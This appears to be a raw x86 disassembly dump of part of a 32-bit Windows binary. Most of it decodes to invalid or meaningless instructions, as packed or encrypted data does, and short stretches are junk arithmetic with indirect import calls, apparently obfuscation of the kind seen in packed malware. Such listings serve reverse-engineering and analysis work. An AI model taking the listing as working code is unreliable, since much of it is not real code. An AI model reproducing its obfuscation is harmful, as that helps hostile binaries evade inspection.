  41ecea:	push   esi
  41eceb:	js     0x41ed52
  41eced:	loopne 0x41ec74
  41ecef:	and    DWORD PTR [ecx+0x1d52c6c9],ebp
  41ecf5:	fwait
  41ecf6:	sub    BYTE PTR [edi-0x2],ah
  41ecf9:	push   ebp
  41ecfa:	fidiv  DWORD PTR [ecx-0x42]
  41ecfd:	add    al,0xbf
  41ecff:	arpl   WORD PTR [edx-0x18],dx
  41ed02:	jge    0x41ecb8
  41ed04:	outs   dx,BYTE PTR ds:[esi]
  41ed05:	cmp    DWORD PTR [edi],esi
  41ed07:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ed08:	mov    eax,0xed7a5358
  41ed0d:	inc    esi
  41ed0e:	retf   0xc76b
  41ed11:	retf   0x215d
  41ed14:	mov    esp,0x976d8324
  41ed19:	dec    edi
  41ed1a:	int3   
  41ed1b:	pushf  
  41ed1c:	mov    ebx,0xd78bbfa3
  41ed21:	int    0xc7
  41ed23:	mov    bl,0x40
  41ed25:	stos   BYTE PTR es:[edi],al
  41ed26:	(bad)  [ebp-0x64]
  41ed29:	push   esp
  41ed2a:	inc    esp
  41ed2b:	pusha  
  41ed2c:	stc    
  41ed2d:	xor    bh,cl
  41ed2f:	in     al,0x1e
  41ed31:	mov    esi,0x508367fb
  41ed36:	jb     0x41ecc3
  41ed38:	leave  
  41ed39:	jns    0x41ecc9
  41ed3b:	jg     0x41ed8f
  41ed3d:	ror    BYTE PTR [edi+0x11],1
  41ed40:	lahf   
  41ed41:	pushf  
  41ed42:	mov    ds:0xde5f3d3c,eax
  41ed47:	fimul  WORD PTR [esi+0x45]
  41ed4a:	sub    al,0x89
  41ed4c:	imul   edi,DWORD PTR [eax-0x4a],0xea4f71fd
  41ed53:	jbe    0x41ecf8
  41ed55:	add    eax,0xe3910131
  41ed5a:	fnstenv [edi+ebx*2+0x7f]
  41ed5e:	lock out 0xe2,eax
  41ed61:	adc    bh,BYTE PTR [ebx+edx*8]
  41ed64:	icebp  
  41ed65:	aaa    
  41ed66:	mov    dh,0x66
  41ed68:	pop    ds
  41ed69:	scas   eax,DWORD PTR es:[edi]
  41ed6a:	and    DWORD PTR [eax],0xf7cbf5fb
  41ed70:	add    DWORD PTR [ecx-0x3f9c1cb0],ebp
  41ed76:	push   ecx
  41ed77:	gs xchg edx,eax
  41ed79:	xor    edx,DWORD PTR [ebp+eiz*1+0x15cb569e]
  41ed80:	xor    BYTE PTR [ebp+ebx*8-0x4c],dh
  41ed84:	sti    
  41ed85:	ss inc eax
  41ed87:	outs   dx,DWORD PTR ds:[esi]
  41ed88:	add    DWORD PTR [edx],esp
  41ed8a:	jge    0x41ede6
  41ed8c:	push   esi
  41ed8d:	loop   0x41edfb
  41ed8f:	arpl   WORD PTR [edi+0x704a82ae],di
  41ed95:	neg    BYTE PTR [ebx-0x11fd8433]
  41ed9b:	into   
  41ed9c:	jmp    0x2007:0x1ea39051
  41eda3:	stos   DWORD PTR es:[edi],eax
  41eda4:	inc    esi
  41eda5:	and    eax,0xa6267be9
  41edaa:	ins    DWORD PTR es:[edi],dx
  41edab:	gs rol BYTE PTR fs:[esi+0x32f5f478],cl
  41edb3:	mov    BYTE PTR [ecx+ebp*8-0xa],dl
  41edb7:	dec    ebx
  41edb8:	pop    ecx
  41edb9:	mov    esp,0x6f348e0c
  41edbe:	xchg   edi,eax
  41edbf:	out    0xfb,al
  41edc1:	pushf  
  41edc2:	enter  0x577c,0x73
  41edc6:	and    DWORD PTR [edi],eax
  41edc8:	xchg   esp,eax
  41edc9:	mov    edx,DWORD PTR [ebx-0x3497ec46]
  41edcf:	sub    DWORD PTR [ecx+0x59],esi
  41edd2:	sbb    al,0x67
  41edd4:	sbb    ecx,DWORD PTR [eax-0x5]
  41edd7:	mov    al,0xb6
  41edd9:	or     DWORD PTR [ebx-0x5e],esi
  41eddc:	daa    
  41eddd:	and    eax,0x2486aa48
  41ede2:	cld    
  41ede3:	pop    ecx
  41ede4:	fcom   DWORD PTR [eax+eax*1]
  41ede7:	cmc    
  41ede8:	mov    ebp,0x70b03bb
  41eded:	push   ss
  41edee:	xchg   ebp,eax
  41edf0:	mov    bl,0xec
  41edf2:	data16 mov dl,0xf3
  41edf5:	mov    esi,0x6a32f89f
  41edfa:	xor    DWORD PTR [eax-0x28],0xffffffb6
  41edfe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41edff:	dec    ebx
  41ee00:	dec    edx
  41ee01:	dec    ecx
  41ee02:	and    al,0x2d
  41ee04:	in     al,0xa2
  41ee06:	jnp    0x41ee6d
  41ee08:	std    
  41ee09:	push   ss
  41ee0a:	xor    al,0xae
  41ee0c:	mov    ds:0x1451419,eax
  41ee11:	add    DWORD PTR [ebx+0x1c],eax
  41ee14:	xor    eax,0x80216f9b
  41ee19:	adc    al,0x77
  41ee1b:	mov    eax,0x20aa61a1
  41ee20:	lods   al,BYTE PTR ds:[esi]
  41ee21:	lods   al,BYTE PTR ds:[esi]
  41ee22:	fstp   DWORD PTR [ecx]
  41ee24:	fs and al,0xcf
  41ee27:	cmc    
  41ee28:	fdivr  DWORD PTR [eax+0x602d9dcc]
  41ee2e:	scas   eax,DWORD PTR es:[edi]
  41ee2f:	and    eax,0xb9d995ed
  41ee34:	sbb    edi,edx
  41ee36:	in     al,dx
  41ee37:	adc    eax,0x91a7477a
  41ee3c:	jp     0x41ee1b
  41ee3e:	inc    ecx
  41ee3f:	mov    bh,0x24
  41ee41:	lea    edx,[ebp-0x47aff370]
  41ee47:	sbb    BYTE PTR [ecx-0x5b],0x6a
  41ee4b:	sbb    dl,BYTE PTR [eax-0xa]
  41ee4e:	inc    edx
  41ee4f:	test   ecx,eax
  41ee51:	sub    eax,0x88b1c8d8
  41ee56:	mov    ?,WORD PTR [edi]
  41ee58:	sahf   
  41ee59:	push   esi
  41ee5a:	mov    esp,0xb6f4f164
  41ee5f:	pop    edx
  41ee60:	jnp    0x41ee8b
  41ee62:	sub    eax,0xdeb6087a
  41ee67:	repnz (bad) 
  41ee69:	cmp    dh,BYTE PTR [ecx]
  41ee6b:	shl    BYTE PTR [eax],cl
  41ee6d:	mov    al,BYTE PTR [ecx-0x2e]
  41ee70:	ins    DWORD PTR es:[edi],dx
  41ee71:	(bad)
  41ee74:	fs push ds
  41ee76:	sahf   
  41ee77:	bound  eax,QWORD PTR [edi]
  41ee79:	jg     0x41ee7d
  41ee7b:	loop   0x41ee04
  41ee7d:	enter  0x6155,0xbf
  41ee81:	imul   ebp,DWORD PTR gs:[edi],0x12
  41ee85:	repz ss ffreep st(2)
  41ee89:	jbe    0x41eeda
  41ee8b:	mov    ch,0x41
  41ee8d:	cmp    BYTE PTR [edx+0x5d],ch
  41ee90:	sbb    dh,BYTE PTR [edx+eax*4]
  41ee93:	jo     0x41ee75
  41ee95:	xchg   esp,eax
  41ee96:	xchg   edx,eax
  41ee97:	bound  esp,QWORD PTR [edx]
  41ee99:	push   ss
  41ee9a:	xlat   BYTE PTR ds:[ebx]
  41ee9b:	test   al,0xe4
  41ee9d:	sub    DWORD PTR [ebx+0x6d],edi
  41eea0:	xchg   ebp,eax
  41eea1:	aas    
  41eea2:	mov    edx,0x96818f62
  41eea7:	add    cl,al
  41eea9:	dec    esi
  41eeaa:	add    al,0x2f
  41eeac:	pop    eax
  41eead:	mov    dh,0x6d
  41eeaf:	(bad)  
  41eeb1:	or     al,0xa2
  41eeb3:	xchg   edi,eax
  41eeb4:	mov    edx,0xe011c257
  41eeb9:	mov    esi,0xd0716d35
  41eebe:	not    DWORD PTR [esi]
  41eec0:	mov    esi,0xfc58b579
  41eec5:	pop    esp
  41eec6:	xchg   edi,eax
  41eec7:	push   ds
  41eec8:	ret    
  41eec9:	jmp    DWORD PTR [esi-0x40]
  41eecc:	dec    edx
  41eecd:	push   ebp
  41eece:	js     0x41eedf
  41eed0:	mov    al,0x7f
  41eed2:	test   ah,ah
  41eed4:	or     dh,BYTE PTR [eax+0x3c]
  41eed7:	retf   0x18f
  41eeda:	fwait
  41eedb:	bound  ebx,QWORD PTR [ebx+eiz*8]
  41eede:	lea    edi,[ebp-0x286057a3]
  41eee4:	call   0xcf75:0x12f10f57
  41eeeb:	out    0x11,eax
  41eeed:	xor    BYTE PTR [ecx-0x42c8a826],bl
  41eef3:	(bad)  
  41eef4:	cmc    
  41eef5:	add    WORD PTR [esi],sp
  41eef8:	xchg   esi,eax
  41eef9:	stos   DWORD PTR es:[edi],eax
  41eefa:	mov    al,0x6a
  41eefc:	cld    
  41eefd:	xchg   ch,al
  41eeff:	popa   
  41ef00:	or     edi,DWORD PTR [esi-0x36]
  41ef03:	inc    eax
  41ef04:	xor    al,0x3c
  41ef06:	dec    edi
  41ef07:	pop    ebx
  41ef08:	lahf   
  41ef09:	push   esi
  41ef0a:	mov    ah,0xa
  41ef0c:	ss ret 0xd3a9
  41ef10:	jmp    0x5522bed0
  41ef15:	dec    edx
  41ef16:	cmp    eax,DWORD PTR [edi+0x5dc937cd]
  41ef1c:	xlat   BYTE PTR ds:[ebx]
  41ef1d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ef1e:	and    cl,ch
  41ef20:	mov    bl,0x87
  41ef22:	in     al,dx
  41ef23:	push   esp
  41ef24:	outs   dx,DWORD PTR ds:[esi]
  41ef25:	fnsave [eax+0x164076ae]
  41ef2b:	add    bl,ch
  41ef2d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ef2e:	jmp    0x15e8a177
  41ef33:	idiv   esp
  41ef35:	(bad)  
  41ef37:	nop
  41ef38:	mov    ds:0x991d1260,al
  41ef3d:	pop    ecx
  41ef3e:	pop    esi
  41ef3f:	repnz ins BYTE PTR es:[edi],dx
  41ef41:	push   eax
  41ef42:	les    ebx,FWORD PTR [ebx]
  41ef44:	push   esi
  41ef45:	dec    ebx
  41ef46:	in     al,dx
  41ef47:	lods   al,BYTE PTR ds:[esi]
  41ef48:	sbb    bh,BYTE PTR [edi]
  41ef4a:	xchg   cl,dh
  41ef4c:	cmp    DWORD PTR es:[ebx+0x1581b445],ecx
  41ef53:	mov    edi,0x93004281
  41ef58:	xor    al,0x0
  41ef5a:	add    BYTE PTR [ebx],al
  41ef5c:	test   DWORD PTR [edi+edi*8-0x1],ecx
  41ef60:	inc    DWORD PTR [ecx+0x29cf2]
  41ef66:	add    BYTE PTR ds:0x2e02,dh
  41ef6c:	sbb    ecx,ecx
  41ef6e:	xor    eax,0x7294
  41ef73:	movzx  edx,WORD PTR ds:0x4282e3
  41ef7a:	sbb    DWORD PTR ds:0x4281bf,edx
  41ef80:	imul   eax,eax,0x68f3
  41ef86:	and    DWORD PTR ds:0x4281d7,edi
  41ef8c:	mov    ecx,DWORD PTR [ebp-0x8c]
  41ef92:	cmp    DWORD PTR ds:0x42834b,0x0
  41ef99:	mov    edx,0x254
  41ef9e:	mov    edx,0x254c
  41efa3:	mov    edx,0x6b4f
  41efa8:	jmp    0x41f000
  41efad:	mov    DWORD PTR ds:0x42833b,0x78fa
  41efb7:	cmp    DWORD PTR ds:0x42834b,0x0
  41efbe:	jb     0x41efe4
  41efc4:	push   DWORD PTR [ebp-0x1c]
  41efc7:	push   0x74cd
  41efcc:	push   0x4a2f
  41efd1:	call   DWORD PTR ds:0x428e6c
  41efd7:	sub    edx,DWORD PTR ds:0x42827f
  41efdd:	inc    edx
  41efde:	and    edx,DWORD PTR ds:0x42829b
  41efe4:	mov    DWORD PTR ds:0x4283e3,0x703b
  41efee:	and    edx,DWORD PTR ds:0x42828b
  41eff4:	xor    edx,DWORD PTR ds:0x4282f7
  41effa:	and    DWORD PTR ds:0x4283f7,edx
  41f000:	and    eax,ecx
  41f002:	sub    eax,0x2818
  41f007:	mov    DWORD PTR [ebp-0xe8],eax
  41f00d:	jmp    0x41f369
  41f012:	adc    al,0x29
  41f015:	fstp   DWORD PTR [ebx]
  41f017:	and    BYTE PTR [edx+0x3a],ah
  41f01a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f01b:	repz mov ebx,0x95c03db0
  41f021:	mov    esp,0x18162999
  41f026:	mov    ds:0xf0181812,eax
  41f02b:	mov    ebx,0xa407df00
  41f030:	icebp  
  41f031:	aas    
  41f032:	mov    dl,0x6c
  41f034:	cmp    BYTE PTR [ecx+0x2c],0x77
  41f038:	rcr    DWORD PTR [edi],0x22
  41f03b:	mov    esp,0xbad93c7d
  41f040:	or     DWORD PTR [esp+ebp*4],ebx
  41f043:	fld    QWORD PTR gs:[esi]
  41f046:	cld    
  41f047:	jo     0x41efe9
  41f049:	mov    ebx,0x48a93c96
  41f04e:	xchg   edx,eax
  41f04f:	sub    esp,DWORD PTR [edi]
  41f051:	cmp    al,0xc
  41f053:	shl    DWORD PTR [ecx+0x1d],cl
  41f056:	cwde   
  41f057:	jmp    0x41f072
  41f059:	fidivr WORD PTR [edx+0x6bbb4cc8]
  41f05f:	mov    ch,ch
  41f061:	inc    ebp
  41f062:	add    al,ah
  41f064:	les    edx,FWORD PTR [ebp+0x44]
  41f067:	pop    ebp
  41f068:	in     al,0xb
  41f06a:	sti    
  41f06b:	xor    DWORD PTR [ebx+0x36eddb7a],0x8a56a6d2
  41f075:	mov    esp,0x710c21d4
  41f07a:	idiv   bh
  41f07c:	sbb    edi,eax
  41f07e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f07f:	xchg   esi,edx
  41f081:	frstor [ebx+edx*1+0x76]
  41f085:	add    ch,al
  41f087:	aad    0xa7
  41f089:	jg     0x41f0e1
  41f08b:	xor    esp,DWORD PTR [esi+eax*4]
  41f08e:	inc    eax
  41f08f:	ja     0x41f107
  41f091:	outs   dx,DWORD PTR ds:[esi]
  41f092:	mov    bh,0x23
  41f094:	mov    dl,0x58
  41f096:	mov    DWORD PTR [ebp-0x37],ebp
  41f099:	and    al,0xa3
  41f09b:	imul   esp,esp,0xffffffb2
  41f09e:	in     al,dx
  41f09f:	daa    
  41f0a0:	sbb    ch,BYTE PTR [ecx+0x2b6cb22c]
  41f0a6:	mov    dh,0xf
  41f0a8:	(bad)  
  41f0a9:	std    
  41f0aa:	fwait
  41f0ab:	mov    ecx,0xd3d0ad0b
  41f0b0:	fild   WORD PTR [eax]
  41f0b2:	icebp  
  41f0b3:	cwde   
  41f0b4:	jae    0x41f05b
  41f0b6:	cmp    al,cl
  41f0b8:	pop    ecx
  41f0b9:	and    edx,eax
  41f0bb:	pop    ss
  41f0bc:	imul   ecx,DWORD PTR [esi+0x35],0x1ff4a7cd
  41f0c3:	(bad)
  41f0c6:	scas   eax,DWORD PTR es:[edi]
  41f0c7:	sbb    bh,BYTE PTR [esi-0x2a54061a]
  41f0cd:	(bad)  
  41f0ce:	lahf   
  41f0cf:	mov    esp,0xac7667ce
  41f0d4:	rcl    edx,cl
  41f0d6:	gs pop esi
  41f0d8:	add    al,BYTE PTR [ebx+edx*4+0x6e1212b5]
  41f0df:	push   ebp
  41f0e0:	ret    0x8315
  41f0e3:	sahf   
  41f0e4:	aad    0x91
  41f0e6:	cdq    
  41f0e7:	mov    bl,0xc5
  41f0e9:	xchg   esp,eax
  41f0ea:	ss clc 
  41f0ec:	test   al,0x98
  41f0ee:	mov    ah,0xa0
  41f0f0:	(bad)  
  41f0f1:	outs   dx,BYTE PTR ds:[esi]
  41f0f2:	dec    ecx
  41f0f3:	lods   eax,DWORD PTR ds:[esi]
  41f0f4:	mov    bh,0x21
  41f0f6:	sar    DWORD PTR [edi+0x5b248d4],cl
  41f0fc:	ja     0x41f172
  41f0fe:	sti    
  41f0ff:	cmp    edx,DWORD PTR [edx-0x44866654]
  41f105:	out    dx,al
  41f106:	jge    0x41f0b6
  41f108:	adc    dh,BYTE PTR [esi+0x10]
  41f10b:	das    
  41f10c:	xor    al,0xa0
  41f10e:	push   ds
  41f10f:	test   BYTE PTR [eax-0x3c0ca681],dh
  41f115:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f116:	iret   
  41f117:	retf   
  41f118:	push   edi
  41f119:	mov    cl,0x4a
  41f11b:	cmp    ecx,DWORD PTR [ecx]
  41f11d:	aas    
  41f11e:	outs   dx,DWORD PTR ds:[esi]
  41f11f:	ds mov al,0xab
  41f122:	test   al,0xc5
  41f124:	add    eax,0x2bd33be
  41f129:	jp     0x41f142
  41f12b:	out    0x11,eax
  41f12d:	dec    ebp
  41f12e:	sub    eax,0x9142a675
  41f133:	fdivr  DWORD PTR [edx+0x60]
  41f136:	test   eax,0xfe9aba5
  41f13b:	add    bh,dh
  41f13d:	push   ecx
  41f13e:	pushf  
  41f13f:	push   edi
  41f140:	out    0x28,al
  41f142:	sbb    dh,al
  41f144:	add    BYTE PTR [ebp+ebp*1+0x3],bh
  41f148:	jp     0x41f132
  41f14a:	jp     0x41f1a2
  41f14c:	xchg   esi,eax
  41f14d:	mov    ds:0x34c6321b,al
  41f152:	fidiv  DWORD PTR [ecx+0xbb208d]
  41f158:	adc    al,0x5
  41f15a:	cmp    DWORD PTR [edi+0x47],ebp
  41f15d:	ins    BYTE PTR es:[edi],dx
  41f15e:	outs   dx,DWORD PTR ds:[esi]
  41f15f:	out    dx,eax
  41f160:	inc    esi
  41f161:	in     eax,dx
  41f162:	fild   WORD PTR [ecx+ebx*1]
  41f165:	xor    BYTE PTR [esi-0x65],0xca
  41f169:	pop    edi
  41f16a:	mov    ch,0xb9
  41f16c:	ret    0xe9cf
  41f16f:	inc    ebp
  41f170:	in     al,0x74
  41f172:	mov    ch,0xc7
  41f174:	fidiv  WORD PTR [ecx-0x2d49d0bb]
  41f17a:	inc    edx
  41f17b:	rcr    BYTE PTR [eax],1
  41f17d:	xor    DWORD PTR ds:0x8d0d4277,edx
  41f183:	adc    esp,ecx
  41f185:	jo     0x41f1c7
  41f187:	add    ebp,ebp
  41f189:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f18a:	sub    DWORD PTR [esp+ebx*4+0x1],edx
  41f18e:	mov    edx,0x438b987a
  41f193:	push   ss
  41f194:	in     eax,dx
  41f195:	repz retf 0x7906
  41f199:	out    dx,al
  41f19a:	int3   
  41f19b:	mov    ebp,?
  41f19d:	cld    
  41f19e:	icebp  
  41f19f:	pusha  
  41f1a0:	jl     0x41f155
  41f1a2:	mov    ah,0x44
  41f1a4:	xor    cl,BYTE PTR [ebx-0x67797e91]
  41f1aa:	mov    al,0x24
  41f1ac:	in     eax,0x15
  41f1ae:	jecxz  0x41f137
  41f1b0:	xchg   BYTE PTR [esi+0x3e],bh
  41f1b3:	in     eax,dx
  41f1b4:	mov    bh,0x91
  41f1b6:	and    DWORD PTR [edi-0x7e872b45],edi
  41f1bc:	dec    ecx
  41f1bd:	call   0xd375:0xf7792523
  41f1c4:	mov    dh,0x34
  41f1c6:	loope  0x41f1ff
  41f1c8:	mov    ebp,DWORD PTR [eax]
  41f1ca:	xor    al,0xcd
  41f1cc:	adc    ch,bh
  41f1ce:	ror    DWORD PTR [ecx+eiz*8-0x3a],0xc0
  41f1d3:	scas   eax,DWORD PTR es:[edi]
  41f1d4:	push   edx
  41f1d5:	pushf  
  41f1d6:	fstp   TBYTE PTR [eax+eax*2-0x3]
  41f1da:	enter  0xcf3,0x15
  41f1de:	mov    ebx,0x951f6135
  41f1e3:	sbb    DWORD PTR [ebx-0x47],esp
  41f1e6:	gs jl  0x41f232
  41f1e9:	xor    eax,edi
  41f1eb:	and    eax,0x12c839f9
  41f1f0:	push   0x18cdd4d2
  41f1f5:	dec    eax
  41f1f6:	cmp    eax,0x561f237a
  41f1fb:	out    0x9d,eax
  41f1fd:	out    dx,al
  41f1fe:	mov    eax,0x68c569a
  41f203:	repz sahf 
  41f205:	xchg   ebp,eax
  41f206:	add    ecx,DWORD PTR [ecx+ebp*4-0x1f]
  41f20a:	in     al,0x16
  41f20c:	or     dh,BYTE PTR [ebp-0x44bb7291]
  41f212:	retf   0x102e
  41f215:	mov    esi,0x2e54924c
  41f21a:	mov    ds:0x5230bb1,al
  41f21f:	enter  0xfe3d,0x8c
  41f223:	sahf   
  41f224:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f225:	push   0xffffff8a
  41f227:	imul   esi,DWORD PTR [ebx-0x68eac361],0x22
  41f22e:	mov    ch,0x6c
  41f230:	pop    ebx
  41f231:	aad    0x3b
  41f233:	jg     0x41f228
  41f235:	mov    ds:0xca13d1f4,eax
  41f23a:	or     BYTE PTR [edx+0x4e],bh
  41f23d:	jnp    0x41f299
  41f23f:	push   eax
  41f240:	sahf   
  41f241:	jbe    0x41f1f1
  41f243:	push   ebp
  41f244:	adc    DWORD PTR [esi],ebx
  41f246:	add    cl,BYTE PTR es:[ebx-0x7e7ca97b]
  41f24d:	fidiv  WORD PTR [edx-0x46]
  41f250:	xor    edx,DWORD PTR [ebp+0x50]
  41f253:	ins    DWORD PTR es:[edi],dx
  41f254:	mov    BYTE PTR [eax-0x68],ch
  41f257:	repnz xlat BYTE PTR ds:[ebx]
  41f259:	xchg   esp,eax
  41f25a:	adc    al,BYTE PTR [edx+0x6ac5c9b3]
  41f260:	sub    edi,ecx
  41f262:	adc    dh,BYTE PTR [ecx+0x11]
  41f265:	jmp    0x41f266
  41f267:	adc    ebx,ebp
  41f269:	data16 add al,0x78
  41f26c:	mov    esi,0x39754433
  41f271:	stos   DWORD PTR es:[edi],eax
  41f272:	data16 cmp BYTE PTR [ebx],dh
  41f275:	mov    bl,0xbe
  41f277:	das    
  41f278:	push   cs
  41f279:	mov    esp,0xa73336fd
  41f27e:	fistp  QWORD PTR [edi-0x42251344]
  41f284:	pop    ebp
  41f285:	imul   esp,DWORD PTR [ebx],0xfffffff1
  41f288:	jb     0x41f301
  41f28a:	xchg   esp,eax
  41f28b:	push   ecx
  41f28c:	and    BYTE PTR [ecx-0x70d8a321],bh
  41f292:	iret   
  41f293:	dec    esi
  41f294:	out    dx,al
  41f295:	test   BYTE PTR [ecx+0x50],bl
  41f298:	dec    ch
  41f29a:	cdq    
  41f29b:	test   al,0xf4
  41f29d:	or     BYTE PTR [eax],al
  41f29f:	mov    ds,WORD PTR [ebp-0x78]
  41f2a2:	jae    0x41f238
  41f2a4:	fdiv   st(3),st
  41f2a6:	mov    eax,gs
  41f2a8:	push   esi
  41f2a9:	mov    edx,0x32b2099c
  41f2ae:	mov    dh,0x5
  41f2b0:	fs dec esp
  41f2b2:	mov    bh,ah
  41f2b4:	mov    al,cl
  41f2b6:	mov    cl,0x7e
  41f2b8:	xchg   ecx,eax
  41f2b9:	cdq    
  41f2ba:	jbe    0x41f261
  41f2bc:	jb     0x41f28c
  41f2be:	inc    ecx
  41f2bf:	jg     0x41f2c0
  41f2c1:	pushf  
  41f2c2:	ret    0x13bb
  41f2c5:	jmp    0x41f2e3
  41f2c7:	nop
  41f2c8:	or     ch,bh
  41f2ca:	out    0xab,eax
  41f2cc:	or     ch,BYTE PTR [edx+ecx*8-0x15]
  41f2d0:	cli    
  41f2d1:	pop    ebp
  41f2d2:	fst    QWORD PTR [esi+0x982e054]
  41f2d8:	xchg   edx,eax
  41f2d9:	std    
  41f2da:	pop    es
  41f2db:	jae    0x41f2be
  41f2dd:	cld    
  41f2de:	scas   eax,DWORD PTR es:[edi]
  41f2df:	sub    al,0xf0
  41f2e1:	stos   BYTE PTR es:[edi],al
  41f2e2:	int    0x19
  41f2e4:	cwde   
  41f2e5:	(bad)  
  41f2e6:	jge    0x41f335
  41f2e8:	aaa    
  41f2e9:	xchg   ecx,esi
  41f2eb:	aas    
  41f2ec:	pop    ebp
  41f2ed:	ins    BYTE PTR es:[edi],dx
  41f2ee:	rcr    DWORD PTR [ecx],1
  41f2f0:	xchg   esi,eax
  41f2f1:	pop    esi
  41f2f2:	cmp    DWORD PTR [ebx-0x44],ebx
  41f2f5:	iret   
  41f2f6:	jl     0x41f366
  41f2f8:	mov    ds:0xf8204209,eax
  41f2fd:	sahf   
  41f2fe:	add    BYTE PTR ds:0x4129106c,ch
  41f304:	jge    0x41f299
  41f306:	push   ebx
  41f307:	jg     0x41f34a
  41f309:	(bad)  
  41f30a:	and    ah,dh
  41f30c:	inc    edi
  41f30d:	mov    cl,0xd1
  41f30f:	sub    dl,ah
  41f311:	jp     0x41f2df
  41f313:	sub    DWORD PTR [ebp+0x34c867cb],ebx
  41f319:	imul   DWORD PTR [ecx+edi*1-0x66]
  41f31d:	stos   DWORD PTR es:[edi],eax
  41f31e:	mov    dh,0xa6
  41f320:	sti    
  41f321:	pop    ss
  41f322:	xchg   edi,eax
  41f323:	stos   BYTE PTR es:[edi],al
  41f324:	outs   dx,BYTE PTR ds:[esi]
  41f325:	ds pop eax
  41f327:	cmp    bh,bh
  41f329:	mov    ch,0x28
  41f32b:	sbb    bl,BYTE PTR [eax+0x41c1cc0]
  41f331:	cmp    BYTE PTR [ecx+0x790b8f31],0x11
  41f338:	(bad)  
  41f339:	ffree  st(3)
  41f33b:	jb     0x41f3ad
  41f33d:	sub    BYTE PTR [esi+0x5d551b49],al
  41f343:	mov    ds:0x9a7c72bb,al
  41f348:	sub    DWORD PTR [ecx],0x3
  41f34b:	dec    ecx
  41f34c:	push   edi
  41f34d:	jge    0x41f35c
  41f34f:	add    edi,eax
  41f351:	push   cs
  41f352:	fs pop esp
  41f354:	lds    eax,FWORD PTR ds:0xb607e0f5
  41f35a:	(bad)  [eax]
  41f35c:	push   0xeea753
  41f361:	dec    ebx
  41f362:	and    eax,0x1d30e6b2
  41f367:	shr    DWORD PTR [edi],cl
  41f369:	mov    DWORD PTR [ebp-0x70],0x6f89
  41f370:	cmp    DWORD PTR ds:0x428363,0x0
  41f377:	movzx  edx,WORD PTR ds:0x42827f
  41f37e:	mov    ecx,DWORD PTR ds:0x4282c7
  41f384:	mov    ecx,DWORD PTR ds:0x4282b3
  41f38a:	jmp    0x41f3f3
  41f38f:	not    eax
  41f391:	mov    DWORD PTR ds:0x42829f,ebx
  41f397:	cmp    DWORD PTR ds:0x428363,0x0
  41f39e:	jbe    0x41f3dd
  41f3a4:	push   DWORD PTR [ebp-0x14]
  41f3a7:	push   DWORD PTR [ebp-0x28]
  41f3aa:	push   DWORD PTR [ebp-0x10]
  41f3ad:	push   0x428173
  41f3b2:	push   0x1cee
  41f3b7:	push   0x479c
  41f3bc:	push   0x8744
  41f3c1:	call   DWORD PTR ds:0x428e70
  41f3c7:	sub    ecx,DWORD PTR ds:0x428297
  41f3cd:	mov    DWORD PTR ds:0x4281e7,0x2f55
  41f3d7:	and    DWORD PTR ds:0x428343,ebx
  41f3dd:	or     DWORD PTR ds:0x42835b,ecx
  41f3e3:	xor    edx,edx
  41f3e5:	or     edx,DWORD PTR ds:0x4281ef
  41f3eb:	mov    edx,DWORD PTR [edx]
  41f3ed:	sbb    DWORD PTR ds:0x428377,edx
  41f3f3:	mov    DWORD PTR [ebp-0xd0],0x5a58
  41f3fd:	mov    DWORD PTR [ebp-0x120],0x3c77
  41f407:	mov    DWORD PTR [ebp-0x2c],0x2129
  41f40e:	or     DWORD PTR ds:0x4281cf,0x8a7
  41f418:	mov    eax,DWORD PTR [ebp-0x2c]
  41f41b:	imul   eax,eax,0x1ada
  41f421:	cmp    DWORD PTR ds:0x4283db,0x0
  41f428:	mov    DWORD PTR ds:0x42836f,0xae0
  41f432:	mov    DWORD PTR ds:0x4281ab,ebx
  41f438:	mov    ecx,DWORD PTR ds:0x4283cb
  41f43e:	jmp    0x41f484
  41f443:	mov    DWORD PTR ds:0x428353,ebx
  41f449:	mov    DWORD PTR ds:0x4281cf,0x2430
  41f453:	cmp    DWORD PTR ds:0x4283db,0x0
  41f45a:	ja     0x41f47c
  41f460:	push   DWORD PTR [ebp-0x18]
  41f463:	push   0x427f85
  41f468:	call   DWORD PTR ds:0x428ef4
  41f46e:	sub    ecx,0x6218
  41f474:	inc    DWORD PTR ds:0x4283e7
  41f47a:	add    edx,edx
  41f47c:	or     edx,ecx
  41f47e:	sub    edx,0x9ad
  41f484:	mov    ecx,DWORD PTR [ebp-0x120]
  41f48a:	cmp    DWORD PTR ds:0x4281e7,0x0
  41f491:	not    edx
  41f493:	mov    DWORD PTR ds:0x42833f,0x6486
  41f49d:	mov    DWORD PTR ds:0x4282ab,0x7a92
  41f4a7:	mov    DWORD PTR ds:0x4282db,ebx
  41f4ad:	jmp    0x41f510
  41f4b2:	mov    DWORD PTR ds:0x4283e3,0x24a4
  41f4bc:	cmp    DWORD PTR ds:0x4281e7,0x0
  41f4c3:	ja     0x41f4ed
  41f4c9:	push   0x42804b
  41f4ce:	push   DWORD PTR [ebp-0x10]
  41f4d1:	call   DWORD PTR ds:0x428e74
  41f4d7:	neg    DWORD PTR ds:0x4281db
  41f4dd:	and    DWORD PTR ds:0x4282bf,0x428343
  41f4e7:	and    DWORD PTR ds:0x4283bf,edi
  41f4ed:	movzx  edx,BYTE PTR ds:0x4281d7
  41f4f4:	sbb    edx,DWORD PTR ds:0x42835f
  41f4fa:	mov    DWORD PTR ds:0x4281d7,edx
  41f500:	sub    DWORD PTR ds:0x4282d3,0x2ffe
  41f50a:	and    edx,0x4c8b
  41f510:	imul   ecx,ecx,0x53ae
  41f516:	and    DWORD PTR ds:0x4281df,ebx
  41f51c:	imul   ecx,ecx,0x7447
  41f522:	mov    edx,DWORD PTR [ebp-0xd0]
  41f528:	sbb    DWORD PTR ds:0x4283e3,0x1933
  41f532:	and    ecx,edx
  41f534:	cmp    DWORD PTR ds:0x4281c3,0x0
  41f53b:	mov    DWORD PTR ds:0x4283df,0x38cb
  41f545:	mov    edx,0x66af
  41f54a:	not    edx
  41f54c:	jmp    0x41f5db
  41f551:	mov    DWORD PTR ds:0x42829f,0x6044
  41f55b:	not    DWORD PTR ds:0x4282ab
